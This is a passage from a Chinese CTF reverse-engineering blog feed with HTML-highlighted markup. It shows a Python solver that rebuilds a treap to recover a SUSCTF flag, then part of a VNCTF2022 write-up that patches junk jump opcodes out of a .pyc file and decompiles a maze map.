通过索引和enc_input得到原始input</span></span><br><span class="line">    tmp = enc_input - <span class="number">97</span> - key[_index] - _index</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">get_real_c(<span class="number">4</span>, <span class="number">223</span>)</span><br><span class="line"><span class="comment"># 100 --&gt;chr(100) = &#x27;d&#x27;</span></span><br></pre></td></tr></table></figure><p>然后写脚本递归就可以得到所有节点的字符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [本节点，左孩子，右孩子，序号，flag]</span></span><br><span class="line"><span class="comment"># 构造二叉树</span></span><br><span class="line">treap = [</span><br><span class="line">    [<span class="number">223</span>, <span class="number">218</span>, <span class="number">262</span>, <span class="number">5</span>, <span class="number">100</span>],</span><br><span class="line">    [<span class="number">218</span>, <span class="number">213</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">213</span>, <span class="number">176</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">176</span>, <span class="number">157</span>, <span class="number">198</span>,  <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">157</span>, <span class="number">0</span>, <span class="number">175</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">175</span>, <span class="number">162</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">198</span>, <span class="number">183</span>, <span class="number">199</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">162</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">183</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">199</span>, <span class="number">0</span>, <span class="number">203</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">203</span>, <span class="number">0</span>, <span class="number">210</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">210</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">262</span>, <span class="number">245</span>, <span class="number">271</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">245</span>, <span class="number">238</span>, <span class="number">257</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">238</span>, <span class="number">233</span>, <span class="number">239</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">233</span>, <span class="number">232</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">232</span>, <span class="number">230</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">230</span>, <span class="number">227</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">227</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">239</span>, <span class="number">0</span>, <span class="number">244</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">244</span>, <span class="number">243</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">243</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">257</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">255</span>, <span class="number">249</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">249</span>, <span class="number">247</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">247</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">271</span>, <span class="number">265</span>, <span class="number">292</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">265</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">292</span>, <span class="number">282</span>, <span class="number">326</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">282</span>, <span class="number">0</span>, <span class="number">287</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">326</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">287</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">treap_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    treap_dict[treap[i][<span class="number">0</span>]] = treap[i][<span class="number">1</span>:<span class="number">5</span>]</span><br><span class="line">key = [<span class="number">0x60</span>, <span class="number">0x46</span>, <span class="number">0x62</span>, <span class="number">0x03</span>, <span class="number">0x16</span>, <span class="number">0x19</span>, <span class="number">0x1E</span>, <span class="number">0x12</span>, <span class="number">0x4D</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x25</span>, <span class="number">0x38</span>, <span class="number">0x2F</span>, <span class="number">0x14</span>, <span class="number">0x4F</span>,</span><br><span class="line">       <span class="number">0x5B</span>, <span class="number">0x2D</span>, <span class="number">0x4C</span>, <span class="number">0x26</span>, <span class="number">0x5A</span>, <span class="number">0x0F</span>, <span class="number">0x04</span>, <span class="number">0x07</span>, <span class="number">0x5F</span>, <span class="number">0x1D</span>, <span class="number">0x48</span>, <span class="number">0x1F</span>, <span class="number">0x67</span>, <span class="number">0x44</span>, <span class="number">0x3B</span>, <span class="number">0x37</span>]</span><br><span class="line">encs = [<span class="number">0x00A2</span>, <span class="number">0x00AF</span>, <span class="number">0x009D</span>, <span class="number">0x00B7</span>, <span class="number">0x00D2</span>, <span class="number">0x00CB</span>, <span class="number">0x00C7</span>, <span class="number">0x00C6</span>, <span class="number">0x00B0</span>, <span class="number">0x00D5</span>, <span class="number">0x00DA</span>, <span class="number">0x00E3</span>, <span class="number">0x00E6</span>, <span class="number">0x00E8</span>, <span class="number">0x00E9</span>, <span class="number">0x00F3</span>,</span><br><span class="line">        <span class="number">0x00F4</span>, <span class="number">0x00EF</span>, <span class="number">0x00EE</span>, <span class="number">0x00F7</span>, <span class="number">0x00F9</span>, <span class="number">0x00FF</span>, <span class="number">0x0101</span>, <span class="number">0x00F5</span>, <span class="number">0x0109</span>, <span class="number">0x011F</span>, <span class="number">0x011A</span>, <span class="number">0x0146</span>, <span class="number">0x0124</span>, <span class="number">0x010F</span>, <span class="number">0x0106</span>, <span class="number">0x00DF</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点和右孩子之间的关系</span></span><br><span class="line">gxs_right = [<span class="number">0x00AC</span>, <span class="number">0x00FD</span>, <span class="number">0x0247</span>, <span class="number">0x0115</span>, <span class="number">0x00D4</span>, <span class="number">0x02B5</span>, <span class="number">0x01FC</span>, <span class="number">0x028B</span>, <span class="number">0x014A</span>, <span class="number">0x004C</span>, <span class="number">0x008E</span>, <span class="number">0x00E9</span>, <span class="number">0x0055</span>, <span class="number">0x012C</span>, <span class="number">0x00F5</span>,</span><br><span class="line">             <span class="number">0x00E3</span>, <span class="number">0x0081</span>, <span class="number">0x02E2</span>, <span class="number">0x01A8</span>, <span class="number">0x0117</span>, <span class="number">0x0152</span>, <span class="number">0x0101</span>, <span class="number">0x003A</span>, <span class="number">0x01D0</span>, <span class="number">0x00A8</span>, <span class="number">0x00CC</span>, <span class="number">0x0149</span>, <span class="number">0x0137</span>, <span class="number">0x0300</span>, <span class="number">0x01EC</span>, <span class="number">0x0276</span>, <span class="number">0x0247</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 节点和左孩子之间的关系</span></span><br><span class="line">gxs_left = [<span class="number">0x00A8</span>, <span class="number">0x0131</span>, <span class="number">0x0113</span>, <span class="number">0x0047</span>, <span class="number">0x009E</span>, <span class="number">0x003B</span>, <span class="number">0x003A</span>, <span class="number">0x00BF</span>, <span class="number">0x0092</span>, <span class="number">0x00F0</span>, <span class="number">0x0174</span>, <span class="number">0x00C3</span>, <span class="number">0x0289</span>, <span class="number">0x0104</span>, <span class="number">0x0260</span>,</span><br><span class="line">            <span class="number">0x004D</span>, <span class="number">0x02FB</span>, <span class="number">0x009E</span>, <span class="number">0x0191</span>, <span class="number">0x0158</span>, <span class="number">0x007D</span>, <span class="number">0x004A</span>, <span class="number">0x01E9</span>, <span class="number">0x0101</span>, <span class="number">0x00D0</span>, <span class="number">0x00FC</span>, <span class="number">0x0070</span>, <span class="number">0x011F</span>, <span class="number">0x0345</span>, <span class="number">0x0162</span>, <span class="number">0x02A4</span>, <span class="number">0x0092</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_child_xuhao</span>(<span class="params">node_c, gx</span>):</span></span><br><span class="line">    <span class="comment"># node_c： 本节点字符</span></span><br><span class="line">    <span class="comment"># gx: 关系</span></span><br><span class="line">    <span class="comment"># 孩子节点序号 * 0x17  + 本节点input = gx</span></span><br><span class="line">    <span class="keyword">if</span> (gx - node_c) % <span class="number">0x17</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>((gx - node_c) / <span class="number">0x17</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_c</span>(<span class="params">_index, enc_input</span>):</span></span><br><span class="line">    <span class="comment"># 通过索引和enc_input得到原始input</span></span><br><span class="line">    tmp = enc_input - <span class="number">97</span> - key[_index] - _index</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">treap_traverse</span>(<span class="params">_root</span>):</span></span><br><span class="line">    <span class="keyword">if</span> _root == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    node_c = get_real_c(treap_dict[_root][<span class="number">2</span>] - <span class="number">1</span>, _root)</span><br><span class="line">    idx = encs.index(_root)     <span class="comment"># 得到后续遍历后的数组中_root的索引</span></span><br><span class="line">    <span class="comment"># 如果左节点不为空，更新左节点的数据</span></span><br><span class="line">    left_root = treap_dict[_root][<span class="number">0</span>]</span><br><span class="line">    right_root = treap_dict[_root][<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> left_root != <span class="number">0</span>:</span><br><span class="line">        left_xh = get_child_xuhao(node_c, gxs_left[idx])</span><br><span class="line">        left_c = get_real_c(left_xh - <span class="number">1</span>, treap_dict[_root][<span class="number">0</span>])      <span class="comment"># 左孩子</span></span><br><span class="line">        treap_dict[left_root][<span class="number">2</span>] = left_xh</span><br><span class="line">        treap_dict[left_root][<span class="number">3</span>] = left_c</span><br><span class="line">        treap_traverse(left_root)</span><br><span class="line">    <span class="keyword">if</span> right_root != <span class="number">0</span>:</span><br><span class="line">        right_xh = get_child_xuhao(node_c, gxs_right[idx])</span><br><span class="line">        right_c = get_real_c(right_xh - <span class="number">1</span>, treap_dict[_root][<span class="number">1</span>])     <span class="comment"># 右孩子</span></span><br><span class="line">        treap_dict[right_root][<span class="number">2</span>] = right_xh</span><br><span class="line">        treap_dict[right_root][<span class="number">3</span>] = right_c</span><br><span class="line">        treap_traverse(right_root)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">treap_traverse(<span class="number">223</span>)</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> _key, value <span class="keyword">in</span> treap_dict.items():</span><br><span class="line">    flag.append([value[<span class="number">2</span>], value[<span class="number">3</span>]])</span><br><span class="line"></span><br><span class="line">flag.sort()</span><br><span class="line">flag = [x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> flag]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SUSCTF&#123;&quot;</span> + <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag)) + <span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="comment"># SUSCTF&#123;8226d8a68d25d8f03be17c4d7027b29c&#125;</span></span><br></pre></td></tr></table></figure><p>flag为：SUSCTF{8226d8a68d25d8f03be17c4d7027b29c}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二叉树 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VNCTF2022_RE_复盘</title>
      <link href="/2022/02/23/VNCTF2022_RE_WP/"/>
      <url>/2022/02/23/VNCTF2022_RE_WP/</url>
      
        <content type="html"><![CDATA[<h1 id="VNCTF2022-RE-复盘"><a href="#VNCTF2022-RE-复盘" class="headerlink" title="VNCTF2022_RE_复盘"></a>VNCTF2022_RE_复盘</h1><h2 id="1-BabyMaze"><a href="#1-BabyMaze" class="headerlink" title="1.BabyMaze"></a>1.BabyMaze</h2><p>题目给出一个 BabyMaze.pyc 文件，尝试用uncompyle6反编译，但是失败 ，于是用脚本反汇编</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装环境</span></span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">header_sizes = [</span><br><span class="line">    <span class="comment"># (size, first version this applies to)</span></span><br><span class="line">    <span class="comment"># pyc files were introduced in 0.9.2 way, way back in June 1991.</span></span><br><span class="line">    (<span class="number">8</span>,  (<span class="number">0</span>, <span class="number">9</span>, <span class="number">2</span>)),  <span class="comment"># 2 bytes magic number, \r\n, 4 bytes UNIX timestamp</span></span><br><span class="line">    (<span class="number">12</span>, (<span class="number">3</span>, <span class="number">6</span>)),     <span class="comment"># added 4 bytes file size</span></span><br><span class="line">    <span class="comment"># bytes 4-8 are flags, meaning of 9-16 depends on what flags are set</span></span><br><span class="line">    <span class="comment"># bit 0 not set: 9-12 timestamp, 13-16 file size</span></span><br><span class="line">    <span class="comment"># bit 0 set: 9-16 file hash (SipHash-2-4, k0 = 4 bytes of the file, k1 = 0)</span></span><br><span class="line">    (<span class="number">16</span>, (<span class="number">3</span>, <span class="number">7</span>)),     <span class="comment"># inserted 4 bytes bit flag field at 4-8</span></span><br><span class="line">    <span class="comment"># future version may add more bytes still, at which point we can extend</span></span><br><span class="line">    <span class="comment"># this table. It is correct for Python versions up to 3.9</span></span><br><span class="line">]</span><br><span class="line">header_size = <span class="built_in">next</span>(s <span class="keyword">for</span> s, v <span class="keyword">in</span> <span class="built_in">reversed</span>(</span><br><span class="line">    header_sizes) <span class="keyword">if</span> sys.version_info &gt;= v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;BabyMaze.pyc&#x27;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    metadata = f.read(header_size)  <span class="comment"># first header_size bytes are metadata</span></span><br><span class="line">    code = marshal.load(f)          <span class="comment"># rest is a marshalled code object</span></span><br><span class="line"></span><br><span class="line">a = dis.dis(code)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(code.co_code))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>           <span class="number">0</span> JUMP_ABSOLUTE            <span class="number">4</span></span><br><span class="line">        &gt;&gt;    <span class="number">2</span> JUMP_ABSOLUTE            <span class="number">6</span></span><br><span class="line">        &gt;&gt;    <span class="number">4</span> JUMP_ABSOLUTE            <span class="number">2</span></span><br><span class="line">        &gt;&gt;    <span class="number">6</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">10</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">14</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">16</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">18</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">20</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">22</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">24</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">26</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">28</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">30</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">34</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">36</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">38</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">40</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">42</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">44</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">46</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">48</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             <span class="number">50</span> LOAD_CONST               <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line">             ..........</span><br><span class="line">             <span class="number">42</span> LOAD_CONST               <span class="number">5</span> (<span class="string">&quot;Sorry, we won&#x27;t acknowledge the existence of your squad.&quot;</span>)</span><br><span class="line">             <span class="number">44</span> CALL_FUNCTION            <span class="number">1</span></span><br><span class="line">             <span class="number">46</span> POP_TOP</span><br><span class="line">        &gt;&gt;   <span class="number">48</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">50</span> RETURN_VALUE</span><br><span class="line">            <span class="number">2030</span>(<span class="number">0X7EE</span>)</span><br></pre></td></tr></table></figure><p>可以发现开头是3个指令的跳转，是这个地方干扰了uncompyle6，于是打开opcode.h，找对应的机器码</p><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220222084407924.png" class="" title="image-20220222084407924"><p>是113（0X71)</p><img src="/2022/02/23/VNCTF2022_RE_WP/image-20220222085103695.png" class="" title="image-20220222085103695"><p>将其删除，并且将 7EE 改为 7E8,然后重新反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.7.4</span></span><br><span class="line"><span class="comment"># Python bytecode 3.8 (3413)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.8.5 (tags/v3.8.5:580fbb0, Jul 20 2020, 15:57:54) [MSC v.1924 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: .\BabyMaze.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2022-02-08 15:12:27</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 3707 bytes</span></span><br><span class="line">_<span class="built_in">map</span> = [</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span 